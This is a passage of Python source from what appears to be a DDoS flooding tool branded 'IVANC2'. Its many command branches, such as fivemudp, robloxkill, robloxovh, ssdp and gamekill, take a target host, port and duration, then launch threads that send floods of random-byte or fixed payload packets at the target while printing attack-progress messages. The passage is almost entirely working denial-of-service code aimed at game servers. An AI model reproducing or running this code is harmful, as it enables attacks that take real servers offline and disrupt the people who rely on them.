					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemudp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemstresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemarkdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "2kdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxkill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxudp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxtcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxstresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxovh":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxnfokill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "robloxsas":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamebypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gameovh":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gamekill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "gameslump":
			try:
				if running >= 20000:
